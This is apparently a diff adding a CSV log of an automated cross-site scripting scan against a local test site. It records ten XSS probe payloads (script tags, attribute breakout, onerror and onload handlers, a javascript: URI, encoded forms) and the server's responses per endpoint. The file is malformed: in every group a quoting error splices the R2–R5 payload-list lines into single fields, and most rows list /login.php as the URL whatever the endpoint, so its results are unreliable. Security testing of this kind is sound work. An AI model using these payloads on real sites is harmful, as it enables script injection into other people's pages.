@@ -1,0 +1,91 @@
+payload_id,endpoint,url,payload,status_code,response_time,content_length,reflected_payload,script_indicators_count,script_indicators,is_malicious,analysis_notes,timestamp
+R1,/,http://localhost:8080/login.php,<script>alert(1)</script>,200,0.04778575897216797,1523,False,0,,False,No XSS indicators found,2025-10-24T11:30:26.115249
+R2,/,http://localhost:8080/login.php,"><script>alert(1)</script>,query_param,Break out of attribute
+R3,';alert(1)//,query_param,JavaScript context break
+R4,<img src=x onerror=alert(1)>,query_param,Image error handler
+R5, onmouseover=alert(1)",200,0.01311945915222168,1523,False,0,,False,No XSS indicators found,2025-10-24T11:30:26.331068
+R6,/,http://localhost:8080/login.php,javascript:alert(1),200,0.015614986419677734,1523,False,0,,False,No XSS indicators found,2025-10-24T11:30:26.547390
+R7,/,http://localhost:8080/login.php,<svg onload=alert(1)>,200,0.011375665664672852,1523,False,0,,False,No XSS indicators found,2025-10-24T11:30:26.760401
+R8,/,http://localhost:8080/login.php,%3Cscript%3Ealert(1)%3C/script%3E,200,0.01426386833190918,1523,False,0,,False,No XSS indicators found,2025-10-24T11:30:26.975881
+R9,/,http://localhost:8080/login.php,&lt;script&gt;alert(1)&lt;/script&gt;,200,0.011530876159667969,1523,False,0,,False,No XSS indicators found,2025-10-24T11:30:27.189289
+R10,/,http://localhost:8080/login.php,<script>alert(document.domain)</script>,200,0.009783744812011719,1523,False,0,,False,No XSS indicators found,2025-10-24T11:30:27.401939
+R1,/login.php,http://localhost:8080/login.php?q=%3Cscript%3Ealert(1)%3C/script%3E,<script>alert(1)</script>,200,0.007113933563232422,1523,False,0,,False,No XSS indicators found,2025-10-24T11:30:27.611112
+R2,/login.php,"http://localhost:8080/login.php?q=%3E%3Cscript%3Ealert(1)%3C/script%3E,query_param,Break%20out%20of%20attribute%0D%0AR3,';alert(1)//,query_param,JavaScript%20context%20break%0D%0AR4,%3Cimg%20src=x%20onerror=alert(1)%3E,query_param,Image%20error%20handler%0D%0AR5,%20onmouseover=alert(1)","><script>alert(1)</script>,query_param,Break out of attribute
+R3,';alert(1)//,query_param,JavaScript context break
+R4,<img src=x onerror=alert(1)>,query_param,Image error handler
+R5, onmouseover=alert(1)",200,0.00743556022644043,1523,False,0,,False,No XSS indicators found,2025-10-24T11:30:27.820561
+R6,/login.php,http://localhost:8080/login.php?q=javascript:alert(1),javascript:alert(1),200,0.008806467056274414,1523,False,0,,False,No XSS indicators found,2025-10-24T11:30:28.031366
+R7,/login.php,http://localhost:8080/login.php?q=%3Csvg%20onload=alert(1)%3E,<svg onload=alert(1)>,200,0.009261846542358398,1523,False,0,,False,No XSS indicators found,2025-10-24T11:30:28.243453
+R8,/login.php,http://localhost:8080/login.php?q=%3Cscript%3Ealert(1)%3C/script%3E,%3Cscript%3Ealert(1)%3C/script%3E,200,0.006024360656738281,1523,False,0,,False,No XSS indicators found,2025-10-24T11:30:28.450503
+R9,/login.php,http://localhost:8080/login.php?q=&lt;script&gt;alert(1)&lt;/script&gt;,&lt;script&gt;alert(1)&lt;/script&gt;,200,0.008858442306518555,1523,False,0,,False,No XSS indicators found,2025-10-24T11:30:28.661375
+R10,/login.php,http://localhost:8080/login.php?q=%3Cscript%3Ealert(document.domain)%3C/script%3E,<script>alert(document.domain)</script>,200,0.008691787719726562,1523,False,0,,False,No XSS indicators found,2025-10-24T11:30:28.870980
+R1,/about.php,http://localhost:8080/about.php?q=%3Cscript%3Ealert(1)%3C/script%3E,<script>alert(1)</script>,200,0.028482437133789062,4840,False,1,script_tag,False,Script indicators: script_tag,2025-10-24T11:30:29.101106
+R2,/about.php,"http://localhost:8080/about.php?q=%3E%3Cscript%3Ealert(1)%3C/script%3E,query_param,Break%20out%20of%20attribute%0D%0AR3,';alert(1)//,query_param,JavaScript%20context%20break%0D%0AR4,%3Cimg%20src=x%20onerror=alert(1)%3E,query_param,Image%20error%20handler%0D%0AR5,%20onmouseover=alert(1)","><script>alert(1)</script>,query_param,Break out of attribute
+R3,';alert(1)//,query_param,JavaScript context break
+R4,<img src=x onerror=alert(1)>,query_param,Image error handler
+R5, onmouseover=alert(1)",200,0.006501913070678711,4840,False,1,script_tag,False,Script indicators: script_tag,2025-10-24T11:30:29.311111
+R6,/about.php,http://localhost:8080/about.php?q=javascript:alert(1),javascript:alert(1),200,0.004043102264404297,4840,False,1,script_tag,False,Script indicators: script_tag,2025-10-24T11:30:29.516799
+R7,/about.php,http://localhost:8080/about.php?q=%3Csvg%20onload=alert(1)%3E,<svg onload=alert(1)>,200,0.006117343902587891,4840,False,1,script_tag,False,Script indicators: script_tag,2025-10-24T11:30:29.726045
+R8,/about.php,http://localhost:8080/about.php?q=%3Cscript%3Ealert(1)%3C/script%3E,%3Cscript%3Ealert(1)%3C/script%3E,200,0.007111072540283203,4840,False,1,script_tag,False,Script indicators: script_tag,2025-10-24T11:30:29.935509
+R9,/about.php,http://localhost:8080/about.php?q=&lt;script&gt;alert(1)&lt;/script&gt;,&lt;script&gt;alert(1)&lt;/script&gt;,200,0.01301884651184082,4840,False,1,script_tag,False,Script indicators: script_tag,2025-10-24T11:30:30.149533
+R10,/about.php,http://localhost:8080/about.php?q=%3Cscript%3Ealert(document.domain)%3C/script%3E,<script>alert(document.domain)</script>,200,0.0070192813873291016,4840,False,1,script_tag,False,Script indicators: script_tag,2025-10-24T11:30:30.360204
+R1,/index.php,http://localhost:8080/login.php,<script>alert(1)</script>,200,0.013211965560913086,1523,False,0,,False,No XSS indicators found,2025-10-24T11:30:30.576239
+R2,/index.php,http://localhost:8080/login.php,"><script>alert(1)</script>,query_param,Break out of attribute
+R3,';alert(1)//,query_param,JavaScript context break
+R4,<img src=x onerror=alert(1)>,query_param,Image error handler
+R5, onmouseover=alert(1)",200,0.014060735702514648,1523,False,0,,False,No XSS indicators found,2025-10-24T11:30:30.792372
+R6,/index.php,http://localhost:8080/login.php,javascript:alert(1),200,0.0159914493560791,1523,False,0,,False,No XSS indicators found,2025-10-24T11:30:31.010255
+R7,/index.php,http://localhost:8080/login.php,<svg onload=alert(1)>,200,0.009606599807739258,1523,False,0,,False,No XSS indicators found,2025-10-24T11:30:31.220934
+R8,/index.php,http://localhost:8080/login.php,%3Cscript%3Ealert(1)%3C/script%3E,200,0.013821840286254883,1523,False,0,,False,No XSS indicators found,2025-10-24T11:30:31.435865
+R9,/index.php,http://localhost:8080/login.php,&lt;script&gt;alert(1)&lt;/script&gt;,200,0.011843681335449219,1523,False,0,,False,No XSS indicators found,2025-10-24T11:30:31.649005
+R10,/index.php,http://localhost:8080/login.php,<script>alert(document.domain)</script>,200,0.012889862060546875,1523,False,0,,False,No XSS indicators found,2025-10-24T11:30:31.863905
+R1,/?search=test,http://localhost:8080/login.php,<script>alert(1)</script>,200,0.014271020889282227,1523,False,0,,False,No XSS indicators found,2025-10-24T11:30:32.083914
+R2,/?search=test,http://localhost:8080/login.php,"><script>alert(1)</script>,query_param,Break out of attribute
+R3,';alert(1)//,query_param,JavaScript context break
+R4,<img src=x onerror=alert(1)>,query_param,Image error handler
+R5, onmouseover=alert(1)",200,0.008619070053100586,1523,False,0,,False,No XSS indicators found,2025-10-24T11:30:32.295570
+R6,/?search=test,http://localhost:8080/login.php,javascript:alert(1),200,0.011465787887573242,1523,False,0,,False,No XSS indicators found,2025-10-24T11:30:32.508109
+R7,/?search=test,http://localhost:8080/login.php,<svg onload=alert(1)>,200,0.011795997619628906,1523,False,0,,False,No XSS indicators found,2025-10-24T11:30:32.721958
+R8,/?search=test,http://localhost:8080/login.php,%3Cscript%3Ealert(1)%3C/script%3E,200,0.008580684661865234,1523,False,0,,False,No XSS indicators found,2025-10-24T11:30:32.931670
+R9,/?search=test,http://localhost:8080/login.php,&lt;script&gt;alert(1)&lt;/script&gt;,200,0.012475013732910156,1523,False,0,,False,No XSS indicators found,2025-10-24T11:30:33.145176
+R10,/?search=test,http://localhost:8080/login.php,<script>alert(document.domain)</script>,200,0.014706850051879883,1523,False,0,,False,No XSS indicators found,2025-10-24T11:30:33.362627
+R1,/?q=test,http://localhost:8080/login.php,<script>alert(1)</script>,200,0.01236724853515625,1523,False,0,,False,No XSS indicators found,2025-10-24T11:30:33.583984
+R2,/?q=test,http://localhost:8080/login.php,"><script>alert(1)</script>,query_param,Break out of attribute
+R3,';alert(1)//,query_param,JavaScript context break
+R4,<img src=x onerror=alert(1)>,query_param,Image error handler
+R5, onmouseover=alert(1)",200,0.01262521743774414,1523,False,0,,False,No XSS indicators found,2025-10-24T11:30:33.798944
+R6,/?q=test,http://localhost:8080/login.php,javascript:alert(1),200,0.010797739028930664,1523,False,0,,False,No XSS indicators found,2025-10-24T11:30:34.011176
+R7,/?q=test,http://localhost:8080/login.php,<svg onload=alert(1)>,200,0.013534307479858398,1523,False,0,,False,No XSS indicators found,2025-10-24T11:30:34.225885
+R8,/?q=test,http://localhost:8080/login.php,%3Cscript%3Ealert(1)%3C/script%3E,200,0.015376806259155273,1523,False,0,,False,No XSS indicators found,2025-10-24T11:30:34.442408
+R9,/?q=test,http://localhost:8080/login.php,&lt;script&gt;alert(1)&lt;/script&gt;,200,0.014099359512329102,1523,False,0,,False,No XSS indicators found,2025-10-24T11:30:34.659727
+R10,/?q=test,http://localhost:8080/login.php,<script>alert(document.domain)</script>,200,0.012152910232543945,1523,False,0,,False,No XSS indicators found,2025-10-24T11:30:34.873875
+R1,/?query=test,http://localhost:8080/login.php,<script>alert(1)</script>,200,0.010698318481445312,1523,False,0,,False,No XSS indicators found,2025-10-24T11:30:35.096459
+R2,/?query=test,http://localhost:8080/login.php,"><script>alert(1)</script>,query_param,Break out of attribute
+R3,';alert(1)//,query_param,JavaScript context break
+R4,<img src=x onerror=alert(1)>,query_param,Image error handler
+R5, onmouseover=alert(1)",200,0.007203102111816406,1523,False,0,,False,No XSS indicators found,2025-10-24T11:30:35.326337
+R6,/?query=test,http://localhost:8080/login.php,javascript:alert(1),200,0.014238357543945312,1523,False,0,,False,No XSS indicators found,2025-10-24T11:30:35.541703
+R7,/?query=test,http://localhost:8080/login.php,<svg onload=alert(1)>,200,0.014655828475952148,1523,False,0,,False,No XSS indicators found,2025-10-24T11:30:35.757769
+R8,/?query=test,http://localhost:8080/login.php,%3Cscript%3Ealert(1)%3C/script%3E,200,0.013789892196655273,1523,False,0,,False,No XSS indicators found,2025-10-24T11:30:35.973603
+R9,/?query=test,http://localhost:8080/login.php,&lt;script&gt;alert(1)&lt;/script&gt;,200,0.010114908218383789,1523,False,0,,False,No XSS indicators found,2025-10-24T11:30:36.184519
+R10,/?query=test,http://localhost:8080/login.php,<script>alert(document.domain)</script>,200,0.007012128829956055,1523,False,0,,False,No XSS indicators found,2025-10-24T11:30:36.394597
+R1,/?id=1,http://localhost:8080/login.php,<script>alert(1)</script>,200,0.016791582107543945,1523,False,0,,False,No XSS indicators found,2025-10-24T11:30:36.612545
+R2,/?id=1,http://localhost:8080/login.php,"><script>alert(1)</script>,query_param,Break out of attribute
+R3,';alert(1)//,query_param,JavaScript context break
+R4,<img src=x onerror=alert(1)>,query_param,Image error handler
+R5, onmouseover=alert(1)",200,0.013864278793334961,1523,False,0,,False,No XSS indicators found,2025-10-24T11:30:36.828047
+R6,/?id=1,http://localhost:8080/login.php,javascript:alert(1),200,0.012780904769897461,1523,False,0,,False,No XSS indicators found,2025-10-24T11:30:37.042828
+R7,/?id=1,http://localhost:8080/login.php,<svg onload=alert(1)>,200,0.013193845748901367,1523,False,0,,False,No XSS indicators found,2025-10-24T11:30:37.257555
+R8,/?id=1,http://localhost:8080/login.php,%3Cscript%3Ealert(1)%3C/script%3E,200,0.013636112213134766,1523,False,0,,False,No XSS indicators found,2025-10-24T11:30:37.472431
+R9,/?id=1,http://localhost:8080/login.php,&lt;script&gt;alert(1)&lt;/script&gt;,200,0.01097869873046875,1523,False,0,,False,No XSS indicators found,2025-10-24T11:30:37.684845
+R10,/?id=1,http://localhost:8080/login.php,<script>alert(document.domain)</script>,200,0.012195110321044922,1523,False,0,,False,No XSS indicators found,2025-10-24T11:30:37.898783
+R1,/?page=1,http://localhost:8080/login.php,<script>alert(1)</script>,200,0.012629032135009766,1523,False,0,,False,No XSS indicators found,2025-10-24T11:30:38.113881
+R2,/?page=1,http://localhost:8080/login.php,"><script>alert(1)</script>,query_param,Break out of attribute
+R3,';alert(1)//,query_param,JavaScript context break
+R4,<img src=x onerror=alert(1)>,query_param,Image error handler
+R5, onmouseover=alert(1)",200,0.021468639373779297,1523,False,0,,False,No XSS indicators found,2025-10-24T11:30:38.336335
+R6,/?page=1,http://localhost:8080/login.php,javascript:alert(1),200,0.010551691055297852,1523,False,0,,False,No XSS indicators found,2025-10-24T11:30:38.548716
+R7,/?page=1,http://localhost:8080/login.php,<svg onload=alert(1)>,200,0.01486968994140625,1523,False,0,,False,No XSS indicators found,2025-10-24T11:30:38.764206
+R8,/?page=1,http://localhost:8080/login.php,%3Cscript%3Ealert(1)%3C/script%3E,200,0.013777732849121094,1523,False,0,,False,No XSS indicators found,2025-10-24T11:30:38.979983
+R9,/?page=1,http://localhost:8080/login.php,&lt;script&gt;alert(1)&lt;/script&gt;,200,0.011635065078735352,1523,False,0,,False,No XSS indicators found,2025-10-24T11:30:39.192828
+R10,/?page=1,http://localhost:8080/login.php,<script>alert(document.domain)</script>,200,0.014347076416015625,1523,False,0,,False,No XSS indicators found,2025-10-24T11:30:39.409098
